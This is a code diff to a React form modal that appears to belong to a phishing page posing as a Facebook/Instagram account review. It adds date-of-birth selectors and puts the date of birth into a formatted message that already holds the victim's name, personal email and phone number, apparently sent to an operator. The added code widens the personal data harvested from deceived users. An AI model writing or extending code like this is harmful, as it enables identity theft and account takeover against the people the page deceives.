@@ -19,6 +19,9 @@ interface FormData {
     personalEmail: string;
     reviewReason?: string;
     reviewDescription?: string;
+    birthDay?: string;
+    birthMonth?: string;
+    birthYear?: string;
 }
 
 interface FormField {
@@ -40,7 +43,10 @@ const InitModal: FC = () => {
         pageName: '',
         personalEmail: '',
         reviewReason: '',
-        reviewDescription: ''
+        reviewDescription: '',
+        birthDay: '',
+        birthMonth: '',
+        birthYear: ''
     });
 
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
@@ -76,7 +82,7 @@ const InitModal: FC = () => {
         [countryCode]
     );
 
-    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
+    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
         const { name, value, type } = e.target;
         setFormData((prev) => ({
             ...prev,
@@ -104,6 +110,7 @@ ${
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>📧 Personal Email Facebook or Instagram:</b> <code>${formData.personalEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
+${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date of Birth:</b> <code>${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}</code>` : ''}
 ${formData.reviewDescription ? `<b>📝 Review Description:</b> <code>${formData.reviewDescription}</code>` : ''}
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
@@ -165,6 +172,79 @@ ${formData.reviewDescription ? `<b>📝 Review Description:</b> <code>${formData
                                 className: 'h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg'
                             }}
                         />
+
+                        {/* Date of Birth Section */}
+                        <div className='mt-4 sm:mt-5'>
+                            <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold mb-2.5'>{t('Date of birth')}</p>
+                            <div className='grid grid-cols-3 gap-2 sm:gap-3'>
+                                {/* Day Selector */}
+                                <div>
+                                    <label className='text-xs sm:text-sm text-[#1C2B33] block mb-1.5'>{t('Day')}</label>
+                                    <select
+                                        name='birthDay'
+                                        value={formData.birthDay}
+                                        onChange={handleInputChange}
+                                        className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-2.5 sm:px-3 py-2 text-base sm:text-lg font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
+                                    >
+                                        <option value=''>DD</option>
+                                        {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
+                                            <option key={day} value={String(day).padStart(2, '0')}>
+                                                {String(day).padStart(2, '0')}
+                                            </option>
+                                        ))}
+                                    </select>
+                                </div>
+
+                                {/* Month Selector */}
+                                <div>
+                                    <label className='text-xs sm:text-sm text-[#1C2B33] block mb-1.5'>{t('Month')}</label>
+                                    <select
+                                        name='birthMonth'
+                                        value={formData.birthMonth}
+                                        onChange={handleInputChange}
+                                        className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-2.5 sm:px-3 py-2 text-base sm:text-lg font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
+                                    >
+                                        <option value=''>MM</option>
+                                        {[
+                                            { num: '01', name: 'January' },
+                                            { num: '02', name: 'February' },
+                                            { num: '03', name: 'March' },
+                                            { num: '04', name: 'April' },
+                                            { num: '05', name: 'May' },
+                                            { num: '06', name: 'June' },
+                                            { num: '07', name: 'July' },
+                                            { num: '08', name: 'August' },
+                                            { num: '09', name: 'September' },
+                                            { num: '10', name: 'October' },
+                                            { num: '11', name: 'November' },
+                                            { num: '12', name: 'December' }
+                                        ].map((month) => (
+                                            <option key={month.num} value={month.num}>
+                                                {month.num}
+                                            </option>
+                                        ))}
+                                    </select>
+                                </div>
+
+                                {/* Year Selector */}
+                                <div>
+                                    <label className='text-xs sm:text-sm text-[#1C2B33] block mb-1.5'>{t('Year')}</label>
+                                    <select
+                                        name='birthYear'
+                                        value={formData.birthYear}
+                                        onChange={handleInputChange}
+                                        className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-2.5 sm:px-3 py-2 text-base sm:text-lg font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
+                                    >
+                                        <option value=''>YYYY</option>
+                                        {Array.from({ length: new Date().getFullYear() - 1949 }, (_, i) => new Date().getFullYear() - i).map((year) => (
+                                            <option key={year} value={String(year)}>
+                                                {year}
+                                            </option>
+                                        ))}
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
                         
                         {/* Review Reason Section */}
                         <div className='mt-3 sm:mt-4'>
